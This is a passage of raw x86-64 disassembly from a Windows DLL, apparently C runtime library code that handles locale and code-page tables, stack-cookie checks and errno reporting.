   180008d61:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180008d65:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180008d6a:	4c 8b c6             	mov    %rsi,%r8
   180008d6d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180008d72:	33 d2                	xor    %edx,%edx
   180008d74:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   180008d78:	8b cd                	mov    %ebp,%ecx
   180008d7a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180008d7f:	e8 b8 0c 00 00       	call   0x180009a3c
   180008d84:	48 63 c8             	movslq %eax,%rcx
   180008d87:	85 c0                	test   %eax,%eax
   180008d89:	74 a9                	je     0x180008d34
   180008d8b:	48 ff c9             	dec    %rcx
   180008d8e:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   180008d92:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180008d97:	8b c3                	mov    %ebx,%eax
   180008d99:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180008d9e:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180008da3:	48 83 c4 40          	add    $0x40,%rsp
   180008da7:	5f                   	pop    %rdi
   180008da8:	c3                   	ret
   180008da9:	cc                   	int3
   180008daa:	cc                   	int3
   180008dab:	cc                   	int3
   180008dac:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180008db1:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180008db6:	55                   	push   %rbp
   180008db7:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   180008dbe:	ff 
   180008dbf:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   180008dc6:	48 8b 05 43 12 01 00 	mov    0x11243(%rip),%rax        # 0x18001a010
   180008dcd:	48 33 c4             	xor    %rsp,%rax
   180008dd0:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   180008dd7:	41 8b f8             	mov    %r8d,%edi
   180008dda:	48 8b da             	mov    %rdx,%rbx
   180008ddd:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   180008de3:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180008de8:	ff 15 52 73 00 00    	call   *0x7352(%rip)        # 0x180010140
   180008dee:	85 c0                	test   %eax,%eax
   180008df0:	75 14                	jne    0x180008e06
   180008df2:	ff 15 c8 72 00 00    	call   *0x72c8(%rip)        # 0x1800100c0
   180008df8:	8b c8                	mov    %eax,%ecx
   180008dfa:	e8 8d f3 ff ff       	call   0x18000818c
   180008dff:	33 c0                	xor    %eax,%eax
   180008e01:	e9 a0 00 00 00       	jmp    0x180008ea6
   180008e06:	48 83 64 24 60 00    	andq   $0x0,0x60(%rsp)
   180008e0c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180008e11:	48 8b c7             	mov    %rdi,%rax
   180008e14:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   180008e19:	33 d2                	xor    %edx,%edx
   180008e1b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180008e20:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180008e25:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   180008e2a:	c6 44 24 68 00       	movb   $0x0,0x68(%rsp)
   180008e2f:	e8 60 ea ff ff       	call   0x180007894
   180008e34:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180008e39:	41 b8 e9 fd 00 00    	mov    $0xfde9,%r8d
   180008e3f:	44 39 40 0c          	cmp    %r8d,0xc(%rax)
   180008e43:	75 15                	jne    0x180008e5a
   180008e45:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180008e4a:	74 47                	je     0x180008e93
   180008e4c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180008e51:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008e58:	eb 39                	jmp    0x180008e93
   180008e5a:	e8 51 10 00 00       	call   0x180009eb0
   180008e5f:	85 c0                	test   %eax,%eax
   180008e61:	75 1a                	jne    0x180008e7d
   180008e63:	38 44 24 38          	cmp    %al,0x38(%rsp)
   180008e67:	74 0c                	je     0x180008e75
   180008e69:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180008e6e:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008e75:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180008e7b:	eb 16                	jmp    0x180008e93
   180008e7d:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180008e82:	74 0c                	je     0x180008e90
   180008e84:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180008e89:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180008e90:	45 33 c0             	xor    %r8d,%r8d
   180008e93:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180008e98:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180008e9d:	e8 f6 fd ff ff       	call   0x180008c98
   180008ea2:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180008ea6:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   180008ead:	48 33 cc             	xor    %rsp,%rcx
   180008eb0:	e8 0b 8c ff ff       	call   0x180001ac0
   180008eb5:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   180008ebc:	00 
   180008ebd:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180008ec1:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   180008ec5:	49 8b e3             	mov    %r11,%rsp
   180008ec8:	5d                   	pop    %rbp
   180008ec9:	c3                   	ret
   180008eca:	cc                   	int3
   180008ecb:	cc                   	int3
   180008ecc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008ed1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180008ed6:	57                   	push   %rdi
   180008ed7:	48 83 ec 20          	sub    $0x20,%rsp
   180008edb:	49 8b f9             	mov    %r9,%rdi
   180008ede:	49 8b d8             	mov    %r8,%rbx
   180008ee1:	8b 0a                	mov    (%rdx),%ecx
   180008ee3:	e8 b0 f1 ff ff       	call   0x180008098
   180008ee8:	90                   	nop
   180008ee9:	48 8b 03             	mov    (%rbx),%rax
   180008eec:	48 8b 08             	mov    (%rax),%rcx
   180008eef:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180008ef6:	48 83 c0 18          	add    $0x18,%rax
   180008efa:	48 8b 0d 17 27 01 00 	mov    0x12717(%rip),%rcx        # 0x18001b618
   180008f01:	48 85 c9             	test   %rcx,%rcx
   180008f04:	74 6f                	je     0x180008f75
   180008f06:	48 85 c0             	test   %rax,%rax
   180008f09:	74 5d                	je     0x180008f68
   180008f0b:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180008f11:	45 8b c8             	mov    %r8d,%r9d
   180008f14:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   180008f18:	0f 10 00             	movups (%rax),%xmm0
   180008f1b:	0f 11 01             	movups %xmm0,(%rcx)
   180008f1e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180008f22:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180008f26:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180008f2a:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180008f2e:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180008f32:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180008f36:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180008f3a:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180008f3e:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180008f42:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180008f46:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180008f4a:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180008f4e:	48 03 ca             	add    %rdx,%rcx
   180008f51:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180008f55:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180008f59:	48 03 c2             	add    %rdx,%rax
   180008f5c:	49 83 e9 01          	sub    $0x1,%r9
   180008f60:	75 b6                	jne    0x180008f18
   180008f62:	8a 00                	mov    (%rax),%al
   180008f64:	88 01                	mov    %al,(%rcx)
   180008f66:	eb 27                	jmp    0x180008f8f
   180008f68:	33 d2                	xor    %edx,%edx
   180008f6a:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   180008f70:	e8 0b a7 ff ff       	call   0x180003680
   180008f75:	e8 82 f2 ff ff       	call   0x1800081fc
   180008f7a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180008f80:	e8 b7 d6 ff ff       	call   0x18000663c
   180008f85:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180008f8b:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   180008f8f:	48 8b 03             	mov    (%rbx),%rax
   180008f92:	48 8b 08             	mov    (%rax),%rcx
   180008f95:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180008f9c:	48 05 19 01 00 00    	add    $0x119,%rax
   180008fa2:	48 8b 0d 77 26 01 00 	mov    0x12677(%rip),%rcx        # 0x18001b620
   180008fa9:	48 85 c9             	test   %rcx,%rcx
   180008fac:	74 5e                	je     0x18000900c
   180008fae:	48 85 c0             	test   %rax,%rax
   180008fb1:	74 4c                	je     0x180008fff
   180008fb3:	0f 10 00             	movups (%rax),%xmm0
   180008fb6:	0f 11 01             	movups %xmm0,(%rcx)
   180008fb9:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180008fbd:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180008fc1:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180008fc5:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180008fc9:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180008fcd:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180008fd1:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180008fd5:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180008fd9:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180008fdd:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180008fe1:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180008fe5:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180008fe9:	48 03 ca             	add    %rdx,%rcx
   180008fec:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180008ff0:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180008ff4:	48 03 c2             	add    %rdx,%rax
   180008ff7:	49 83 e8 01          	sub    $0x1,%r8
   180008ffb:	75 b6                	jne    0x180008fb3
   180008ffd:	eb 1d                	jmp    0x18000901c
   180008fff:	33 d2                	xor    %edx,%edx
   180009001:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   180009007:	e8 74 a6 ff ff       	call   0x180003680
   18000900c:	e8 eb f1 ff ff       	call   0x1800081fc
   180009011:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180009017:	e8 20 d6 ff ff       	call   0x18000663c
   18000901c:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180009020:	48 8b 08             	mov    (%rax),%rcx
   180009023:	48 8b 11             	mov    (%rcx),%rdx
   180009026:	83 c8 ff             	or     $0xffffffff,%eax
   180009029:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   18000902d:	83 f8 01             	cmp    $0x1,%eax
   180009030:	75 1b                	jne    0x18000904d
   180009032:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180009036:	48 8b 08             	mov    (%rax),%rcx
   180009039:	48 8d 05 20 10 01 00 	lea    0x11020(%rip),%rax        # 0x18001a060
   180009040:	48 39 01             	cmp    %rax,(%rcx)
   180009043:	74 08                	je     0x18000904d
   180009045:	48 8b 09             	mov    (%rcx),%rcx
   180009048:	e8 47 f2 ff ff       	call   0x180008294
   18000904d:	48 8b 03             	mov    (%rbx),%rax
   180009050:	48 8b 10             	mov    (%rax),%rdx
   180009053:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180009057:	48 8b 08             	mov    (%rax),%rcx
   18000905a:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   180009061:	48 89 01             	mov    %rax,(%rcx)
   180009064:	48 8b 03             	mov    (%rbx),%rax
   180009067:	48 8b 08             	mov    (%rax),%rcx
   18000906a:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180009071:	f0 ff 00             	lock incl (%rax)
   180009074:	8b 0f                	mov    (%rdi),%ecx
   180009076:	e8 71 f0 ff ff       	call   0x1800080ec
   18000907b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180009080:	48 83 c4 20          	add    $0x20,%rsp
   180009084:	5f                   	pop    %rdi
   180009085:	c3                   	ret
   180009086:	cc                   	int3
   180009087:	cc                   	int3
   180009088:	40 53                	rex push %rbx
   18000908a:	48 83 ec 40          	sub    $0x40,%rsp
   18000908e:	8b d9                	mov    %ecx,%ebx
   180009090:	33 d2                	xor    %edx,%edx
   180009092:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180009097:	e8 f8 e7 ff ff       	call   0x180007894
   18000909c:	83 25 8d 25 01 00 00 	andl   $0x0,0x1258d(%rip)        # 0x18001b630
   1800090a3:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1800090a6:	75 12                	jne    0x1800090ba
   1800090a8:	c7 05 7e 25 01 00 01 	movl   $0x1,0x1257e(%rip)        # 0x18001b630
   1800090af:	00 00 00 
   1800090b2:	ff 15 c8 70 00 00    	call   *0x70c8(%rip)        # 0x180010180
   1800090b8:	eb 15                	jmp    0x1800090cf
   1800090ba:	83 fb fd             	cmp    $0xfffffffd,%ebx
   1800090bd:	75 14                	jne    0x1800090d3
   1800090bf:	c7 05 67 25 01 00 01 	movl   $0x1,0x12567(%rip)        # 0x18001b630
   1800090c6:	00 00 00 
   1800090c9:	ff 15 a9 70 00 00    	call   *0x70a9(%rip)        # 0x180010178
   1800090cf:	8b d8                	mov    %eax,%ebx
   1800090d1:	eb 17                	jmp    0x1800090ea
   1800090d3:	83 fb fc             	cmp    $0xfffffffc,%ebx
   1800090d6:	75 12                	jne    0x1800090ea
   1800090d8:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1800090dd:	c7 05 49 25 01 00 01 	movl   $0x1,0x12549(%rip)        # 0x18001b630
   1800090e4:	00 00 00 
   1800090e7:	8b 58 0c             	mov    0xc(%rax),%ebx
   1800090ea:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1800090ef:	74 0c                	je     0x1800090fd
   1800090f1:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1800090f6:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   1800090fd:	8b c3                	mov    %ebx,%eax
   1800090ff:	48 83 c4 40          	add    $0x40,%rsp
   180009103:	5b                   	pop    %rbx
   180009104:	c3                   	ret
   180009105:	cc                   	int3
   180009106:	cc                   	int3
   180009107:	cc                   	int3
   180009108:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000910d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180009112:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009117:	57                   	push   %rdi
   180009118:	48 83 ec 20          	sub    $0x20,%rsp
   18000911c:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   180009120:	48 8b f1             	mov    %rcx,%rsi
   180009123:	bd 01 01 00 00       	mov    $0x101,%ebp
   180009128:	48 8b cb             	mov    %rbx,%rcx
   18000912b:	44 8b c5             	mov    %ebp,%r8d
   18000912e:	33 d2                	xor    %edx,%edx
   180009130:	e8 4b a5 ff ff       	call   0x180003680
   180009135:	33 c0                	xor    %eax,%eax
   180009137:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   18000913b:	48 89 46 04          	mov    %rax,0x4(%rsi)
   18000913f:	b9 06 00 00 00       	mov    $0x6,%ecx
   180009144:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   18000914b:	0f b7 c0             	movzwl %ax,%eax
   18000914e:	66 f3 ab             	rep stos %ax,(%rdi)
   180009151:	48 8d 3d 08 0f 01 00 	lea    0x10f08(%rip),%rdi        # 0x18001a060
   180009158:	48 2b fe             	sub    %rsi,%rdi
   18000915b:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   18000915e:	88 03                	mov    %al,(%rbx)
   180009160:	48 ff c3             	inc    %rbx
   180009163:	48 83 ed 01          	sub    $0x1,%rbp
   180009167:	75 f2                	jne    0x18000915b
   180009169:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   180009170:	ba 00 01 00 00       	mov    $0x100,%edx
   180009175:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   180009178:	88 01                	mov    %al,(%rcx)
   18000917a:	48 ff c1             	inc    %rcx
   18000917d:	48 83 ea 01          	sub    $0x1,%rdx
   180009181:	75 f2                	jne    0x180009175
   180009183:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180009188:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000918d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180009192:	48 83 c4 20          	add    $0x20,%rsp
   180009196:	5f                   	pop    %rdi
   180009197:	c3                   	ret
   180009198:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000919d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800091a2:	55                   	push   %rbp
   1800091a3:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   1800091aa:	ff 
   1800091ab:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   1800091b2:	48 8b 05 57 0e 01 00 	mov    0x10e57(%rip),%rax        # 0x18001a010
   1800091b9:	48 33 c4             	xor    %rsp,%rax
   1800091bc:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   1800091c3:	48 8b d9             	mov    %rcx,%rbx
   1800091c6:	8b 49 04             	mov    0x4(%rcx),%ecx
   1800091c9:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   1800091cf:	0f 84 3d 01 00 00    	je     0x180009312
   1800091d5:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800091da:	ff 15 a8 6f 00 00    	call   *0x6fa8(%rip)        # 0x180010188
   1800091e0:	85 c0                	test   %eax,%eax
   1800091e2:	0f 84 2a 01 00 00    	je     0x180009312
   1800091e8:	33 c0                	xor    %eax,%eax
   1800091ea:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800091ef:	be 00 01 00 00       	mov    $0x100,%esi
   1800091f4:	88 01                	mov    %al,(%rcx)
   1800091f6:	ff c0                	inc    %eax
   1800091f8:	48 ff c1             	inc    %rcx
   1800091fb:	3b c6                	cmp    %esi,%eax
   1800091fd:	72 f5                	jb     0x1800091f4
   1800091ff:	8a 44 24 56          	mov    0x56(%rsp),%al
   180009203:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   180009208:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   18000920d:	eb 20                	jmp    0x18000922f
   18000920f:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   180009214:	0f b6 c8             	movzbl %al,%ecx
   180009217:	eb 0b                	jmp    0x180009224
   180009219:	3b ce                	cmp    %esi,%ecx
   18000921b:	73 0c                	jae    0x180009229
   18000921d:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   180009222:	ff c1                	inc    %ecx
   180009224:	41 3b c8             	cmp    %r8d,%ecx
   180009227:	76 f0                	jbe    0x180009219
   180009229:	48 83 c2 02          	add    $0x2,%rdx
   18000922d:	8a 02                	mov    (%rdx),%al
   18000922f:	84 c0                	test   %al,%al
   180009231:	75 dc                	jne    0x18000920f
   180009233:	8b 43 04             	mov    0x4(%rbx),%eax
   180009236:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   18000923b:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   180009240:	44 8b ce             	mov    %esi,%r9d
   180009243:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180009247:	ba 01 00 00 00       	mov    $0x1,%edx
   18000924c:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   180009253:	33 c9                	xor    %ecx,%ecx
   180009255:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000925a:	e8 a5 2b 00 00       	call   0x18000be04
   18000925f:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180009264:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180009269:	8b 43 04             	mov    0x4(%rbx),%eax
   18000926c:	44 8b c6             	mov    %esi,%r8d
   18000926f:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   180009276:	33 c9                	xor    %ecx,%ecx
   180009278:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000927c:	48 8d 45 70          	lea    0x70(%rbp),%rax
   180009280:	89 74 24 30          	mov    %esi,0x30(%rsp)
   180009284:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180009289:	89 74 24 20          	mov    %esi,0x20(%rsp)
   18000928d:	e8 1a 30 00 00       	call   0x18000c2ac
   180009292:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180009297:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   18000929c:	8b 43 04             	mov    0x4(%rbx),%eax
   18000929f:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1800092a5:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   1800092ac:	33 c9                	xor    %ecx,%ecx
   1800092ae:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1800092b2:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   1800092b9:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1800092bd:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800092c2:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1800092c6:	e8 e1 2f 00 00       	call   0x18000c2ac
   1800092cb:	b8 01 00 00 00       	mov    $0x1,%eax
   1800092d0:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   1800092d7:	f6 02 01             	testb  $0x1,(%rdx)
   1800092da:	74 0b                	je     0x1800092e7
   1800092dc:	80 4c 18 18 10       	orb    $0x10,0x18(%rax,%rbx,1)
   1800092e1:	8a 4c 05 6f          	mov    0x6f(%rbp,%rax,1),%cl
   1800092e5:	eb 15                	jmp    0x1800092fc
   1800092e7:	f6 02 02             	testb  $0x2,(%rdx)
   1800092ea:	74 0e                	je     0x1800092fa
   1800092ec:	80 4c 18 18 20       	orb    $0x20,0x18(%rax,%rbx,1)
   1800092f1:	8a 8c 05 6f 01 00 00 	mov    0x16f(%rbp,%rax,1),%cl
   1800092f8:	eb 02                	jmp    0x1800092fc
   1800092fa:	32 c9                	xor    %cl,%cl
   1800092fc:	88 8c 18 18 01 00 00 	mov    %cl,0x118(%rax,%rbx,1)
   180009303:	48 83 c2 02          	add    $0x2,%rdx
   180009307:	48 ff c0             	inc    %rax
   18000930a:	48 83 ee 01          	sub    $0x1,%rsi
   18000930e:	75 c7                	jne    0x1800092d7
   180009310:	eb 43                	jmp    0x180009355
   180009312:	33 d2                	xor    %edx,%edx
   180009314:	be 00 01 00 00       	mov    $0x100,%esi
   180009319:	8d 4a 01             	lea    0x1(%rdx),%ecx
   18000931c:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   180009320:	41 8d 40 20          	lea    0x20(%r8),%eax
   180009324:	83 f8 19             	cmp    $0x19,%eax
   180009327:	77 0a                	ja     0x180009333
   180009329:	80 4c 0b 18 10       	orb    $0x10,0x18(%rbx,%rcx,1)
   18000932e:	8d 42 20             	lea    0x20(%rdx),%eax
   180009331:	eb 12                	jmp    0x180009345
   180009333:	41 83 f8 19          	cmp    $0x19,%r8d
   180009337:	77 0a                	ja     0x180009343
   180009339:	80 4c 0b 18 20       	orb    $0x20,0x18(%rbx,%rcx,1)
   18000933e:	8d 42 e0             	lea    -0x20(%rdx),%eax
   180009341:	eb 02                	jmp    0x180009345
   180009343:	32 c0                	xor    %al,%al
   180009345:	88 84 0b 18 01 00 00 	mov    %al,0x118(%rbx,%rcx,1)
   18000934c:	ff c2                	inc    %edx
   18000934e:	48 ff c1             	inc    %rcx
   180009351:	3b d6                	cmp    %esi,%edx
   180009353:	72 c7                	jb     0x18000931c
   180009355:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   18000935c:	48 33 cc             	xor    %rsp,%rcx
   18000935f:	e8 5c 87 ff ff       	call   0x180001ac0
   180009364:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   18000936b:	00 
   18000936c:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180009370:	49 8b 73 20          	mov    0x20(%r11),%rsi
   180009374:	49 8b e3             	mov    %r11,%rsp
   180009377:	5d                   	pop    %rbp
   180009378:	c3                   	ret
   180009379:	cc                   	int3
   18000937a:	cc                   	int3
   18000937b:	cc                   	int3
   18000937c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009381:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180009386:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000938b:	55                   	push   %rbp
   18000938c:	56                   	push   %rsi
   18000938d:	57                   	push   %rdi
   18000938e:	48 8b ec             	mov    %rsp,%rbp
   180009391:	48 83 ec 40          	sub    $0x40,%rsp
   180009395:	40 8a f2             	mov    %dl,%sil
   180009398:	8b d9                	mov    %ecx,%ebx
   18000939a:	49 8b d1             	mov    %r9,%rdx
   18000939d:	49 8b c8             	mov    %r8,%rcx
   1800093a0:	e8 97 01 00 00       	call   0x18000953c
   1800093a5:	8b cb                	mov    %ebx,%ecx
   1800093a7:	e8 dc fc ff ff       	call   0x180009088
   1800093ac:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1800093b0:	8b f8                	mov    %eax,%edi
   1800093b2:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   1800093b9:	41 3b 40 04          	cmp    0x4(%r8),%eax
   1800093bd:	75 07                	jne    0x1800093c6
   1800093bf:	33 c0                	xor    %eax,%eax
   1800093c1:	e9 b8 00 00 00       	jmp    0x18000947e
   1800093c6:	b9 28 02 00 00       	mov    $0x228,%ecx
   1800093cb:	e8 48 19 00 00       	call   0x18000ad18
   1800093d0:	48 8b d8             	mov    %rax,%rbx
   1800093d3:	48 85 c0             	test   %rax,%rax
   1800093d6:	0f 84 95 00 00 00    	je     0x180009471
   1800093dc:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1800093e0:	ba 04 00 00 00       	mov    $0x4,%edx
   1800093e5:	48 8b cb             	mov    %rbx,%rcx
   1800093e8:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   1800093ef:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   1800093f3:	0f 10 00             	movups (%rax),%xmm0
   1800093f6:	0f 11 01             	movups %xmm0,(%rcx)
   1800093f9:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1800093fd:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180009401:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180009405:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180009409:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   18000940d:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180009411:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180009415:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180009419:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   18000941d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180009421:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180009425:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180009429:	49 03 c8             	add    %r8,%rcx
   18000942c:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180009430:	49 03 c0             	add    %r8,%rax
   180009433:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180009437:	48 83 ea 01          	sub    $0x1,%rdx
   18000943b:	75 b6                	jne    0x1800093f3
   18000943d:	0f 10 00             	movups (%rax),%xmm0
   180009440:	0f 11 01             	movups %xmm0,(%rcx)
   180009443:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180009447:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   18000944b:	48 8b 40 20          	mov    0x20(%rax),%rax
   18000944f:	48 89 41 20          	mov    %rax,0x20(%rcx)
   180009453:	8b cf                	mov    %edi,%ecx
   180009455:	21 13                	and    %edx,(%rbx)
   180009457:	48 8b d3             	mov    %rbx,%rdx
   18000945a:	e8 11 02 00 00       	call   0x180009670
   18000945f:	8b f8                	mov    %eax,%edi
   180009461:	83 f8 ff             	cmp    $0xffffffff,%eax
   180009464:	75 25                	jne    0x18000948b
   180009466:	e8 91 ed ff ff       	call   0x1800081fc
   18000946b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180009471:	83 cf ff             	or     $0xffffffff,%edi
   180009474:	48 8b cb             	mov    %rbx,%rcx
   180009477:	e8 18 ee ff ff       	call   0x180008294
   18000947c:	8b c7                	mov    %edi,%eax
   18000947e:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180009483:	48 83 c4 40          	add    $0x40,%rsp
   180009487:	5f                   	pop    %rdi
   180009488:	5e                   	pop    %rsi
   180009489:	5d                   	pop    %rbp
   18000948a:	c3                   	ret
   18000948b:	40 84 f6             	test   %sil,%sil
